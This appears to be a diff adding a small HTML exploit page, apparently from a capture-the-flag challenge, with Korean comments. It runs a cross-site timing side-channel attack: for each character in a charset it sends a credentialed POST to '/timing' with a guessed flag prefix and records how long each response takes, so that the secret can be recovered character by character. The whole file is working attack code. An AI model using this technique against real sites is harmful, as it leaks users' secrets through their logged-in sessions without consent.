@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<body>
+  <!-- 결과를 찍어줄 영역 -->
+  <pre id="result" style="white-space: pre-wrap;"></pre>
+
+  <script>
+    const fl = "{{ flag }}";
+    const charset = [
+      'a','b','c','d','e','f','g','h','i','j','k','l','m',
+      'n','o','p','q','r','s','t','u','v','w','x','y','z','}'
+    ];
+
+    const result = document.getElementById("result");
+
+    charset.forEach((chr) => {
+      const start = performance.now();
+
+      fetch('/timing', {
+        method: "POST",
+        mode: 'no-cors',
+        credentials: 'include',
+        // body는 문자열이나 FormData여야 함
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: "keyword=" + fl + encodeURIComponent(chr),
+      }).then(() => {
+        const time = performance.now() - start;
+
+        // 브라우저 화면에 찍기
+        result.innerText += `문자 ${chr} 요청 시간: ${time.toFixed(2)} ms\n`;
+      }).catch((err) => {
+        result.innerText += `문자 ${chr} 요청 실패: ${err}\n`;
+      });
+    });
+  </script>
+</body>
